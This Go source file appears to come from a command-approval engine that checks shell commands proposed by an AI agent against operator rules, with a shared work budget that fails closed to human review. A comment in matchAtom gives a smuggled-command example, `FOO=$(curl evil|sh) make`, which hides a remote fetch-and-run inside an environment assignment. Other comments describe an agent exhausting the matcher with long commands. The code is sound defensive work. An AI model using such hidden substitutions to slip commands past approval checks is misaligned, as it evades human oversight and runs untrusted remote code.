package localmost

// maxMatchSteps bounds the total matcher work for one command evaluation. The
// seq/quant/closure matcher enumerates reachable end positions and recurses
// combinatorially over quantified terms — a classic backtracking shape that can
// go super-linear. Rules are operator-controlled, but a malicious agent
// controls the command length, so a pathological rule against a long command
// could otherwise pin a CPU on the approval path. The bound is far above any
// realistic rule/command pairing. See issue #798.
const maxMatchSteps = 1_000_000

// evalBudget is a single work budget shared across every rule, unless
// expression, and @sub recursion within one Engine.Evaluate call. When the
// budget is exhausted, exhausted latches true and every subsequent seq returns
// no positions; subPolicy observes the flag and fails closed to PolicyAsk
// (human review) rather than trusting an incomplete match. A shared budget also
// stops an attacker from multiplying the per-rule bound by the rule count or
// @sub depth. See issue #798.
type evalBudget struct {
	steps     int
	exhausted bool
}

// charge counts one unit of matcher work and reports whether the budget is now
// exhausted. Once exhausted it stays exhausted (latched).
func (b *evalBudget) charge() bool {
	if b.exhausted {
		return true
	}

	b.steps++
	if b.steps > maxMatchSteps {
		b.exhausted = true
	}

	return b.exhausted
}

// matchState carries the tokens being matched, the engine (for @sub recursion),
// and the shared work budget.
type matchState struct {
	eng    *Engine
	tokens []token
	budget *evalBudget
}

// ruleMatches reports whether a compiled rule matches a subcommand: the term
// sequence must consume all tokens, the redirect/pipe constraints must hold,
// and no unless expression may appear anywhere in the tokens. Matcher work is
// charged against the shared budget; callers must check budget.exhausted after
// a false result, since an incomplete (budget-cut) match also returns false.
func (e *Engine) ruleMatches(r compiledRule, sub subcommand, budget *evalBudget) bool {
	if !redirectOK(r.redirect, sub) {
		return false
	}

	if !pipeOK(r.pipe, sub) {
		return false
	}

	ms := &matchState{eng: e, tokens: sub.tokens, budget: budget}

	for _, u := range r.unless {
		if ms.appearsAnywhere(u) {
			return false
		}
	}

	for _, end := range ms.seq(r.terms, 0) {
		if end == len(sub.tokens) {
			return true
		}
	}

	return false
}

// seq returns every token index reachable after matching the whole term
// sequence starting at pos.
func (ms *matchState) seq(terms []term, pos int) []int {
	if ms.budget.charge() {
		return nil
	}

	if len(terms) == 0 {
		return []int{pos}
	}

	t := terms[0]
	rest := terms[1:]

	// @sub is terminal: it consumes the rest of the tokens as a subcommand that
	// must itself resolve to allow.
	if t.kind == termSub {
		if ms.eng.tokensAllowed(ms.tokens[pos:], ms.budget) {
			return []int{len(ms.tokens)}
		}

		return nil
	}

	var out []int
	for _, p := range ms.quant(t, pos) {
		out = append(out, ms.seq(rest, p)...)
	}

	return out
}

// quant applies a term's quantifier, returning reachable end positions.
func (ms *matchState) quant(t term, pos int) []int {
	switch t.quant {
	case quantOne:
		return ms.once(t, pos)
	case quantOpt:
		return append([]int{pos}, ms.once(t, pos)...)
	case quantStar:
		return ms.closure(t, pos, true)
	case quantPlus:
		return ms.closure(t, pos, false)
	default:
		return nil
	}
}

// once matches a term exactly once, returning reachable end positions.
func (ms *matchState) once(t term, pos int) []int {
	switch t.kind {
	case termGroup:
		return ms.seq(t.group, pos)
	default:
		if pos < len(ms.tokens) && matchAtom(t, ms.tokens[pos]) {
			return []int{pos + 1}
		}

		return nil
	}
}

// closure matches a term zero/one-or-more times (Kleene star/plus).
func (ms *matchState) closure(t term, pos int, allowZero bool) []int {
	reach := map[int]bool{}
	visited := map[int]bool{}

	var walk func(p int)

	walk = func(p int) {
		if visited[p] {
			return
		}

		visited[p] = true

		for _, np := range ms.once(t, p) {
			reach[np] = true

			if np > p { // only recurse when progress is made (avoids loops)
				walk(np)
			}
		}
	}
	walk(pos)

	var out []int
	if allowZero {
		out = append(out, pos)
	}

	for p := range reach {
		out = append(out, p)
	}

	return out
}

// appearsAnywhere reports whether a term sequence matches starting at any
// position in the tokens (used for unless expressions).
func (ms *matchState) appearsAnywhere(terms []term) bool {
	for start := 0; start <= len(ms.tokens); start++ {
		if len(ms.seq(terms, start)) > 0 {
			return true
		}
	}

	return false
}

// matchAtom matches a single (non-group) term against one token.
func matchAtom(t term, tok token) bool {
	switch t.kind {
	case termLiteral:
		return tok.literal && tok.text == t.literal
	case termArg:
		return tok.kind == tokWord && tok.literal
	case termPath:
		return tok.kind == tokWord && tok.literal && isValidPath(tok.text)
	case termInt:
		return tok.kind == tokWord && tok.literal && isInt(tok.text)
	case termEnv:
		// Require a literal assignment value (consistent with @arg/@path/@int).
		// A non-literal value contains an expansion such as a command
		// substitution ($(...), backticks, <(...)), which the shell would
		// execute but no deny rule ever sees. Letting @env match it would
		// auto-approve the hidden command (e.g. `FOO=$(curl evil|sh) make`).
		return tok.kind == tokAssign && tok.literal
	case termChoice:
		if !tok.literal {
			return false
		}

		for _, c := range t.choices {
			if c == tok.text {
				return true
			}
		}

		return false
	default:
		return false
	}
}

func redirectOK(p redirectPolicy, sub subcommand) bool {
	switch p {
	case redirectAny:
		return true
	case redirectNone:
		return len(sub.redirs) == 0
	default: // redirectSafe
		for _, r := range sub.redirs {
			if !r.safe {
				return false
			}
		}

		return true
	}
}

func pipeOK(p pipePolicy, sub subcommand) bool {
	switch p {
	case pipeNone:
		return !sub.inPipe
	case pipeIn:
		return !sub.inPipe || sub.pipeEnd
	case pipeOut:
		return !sub.inPipe || sub.pipeStart
	default: // pipeAny
		return true
	}
}

func isInt(s string) bool {
	if s == "" {
		return false
	}

	i := 0
	if s[0] == '+' || s[0] == '-' {
		i = 1
	}

	if i == len(s) {
		return false
	}

	for ; i < len(s); i++ {
		if s[i] < '0' || s[i] > '9' {
			return false
		}
	}

	return true
}

// isValidPath reports whether s is a valid POSIX pathname: non-empty and free
// of NUL bytes. This is deliberately as permissive as localmost's @path — Linux
// only forbids the empty string and NUL in a pathname, so a bare relative name
// like "foo", a dot-file, an option-looking "-x", or an absolute "/etc/passwd"
// are all valid paths. @path is therefore only marginally narrower than @arg
// (it additionally rejects the empty-string argument ""). Tightening this to a
// "path-shaped" heuristic (requiring a leading /, ./, ~, etc.) would break
// parity with localmost, which allows e.g. `mkdir foo`. See issue #732 and the
// documented behaviour in
// docs/design/2026-07-03-pluggable-approvals-backends-design.md.
func isValidPath(s string) bool {
	if s == "" {
		return false
	}

	for _, r := range s {
		if r == 0 {
			return false
		}
	}

	return true
}
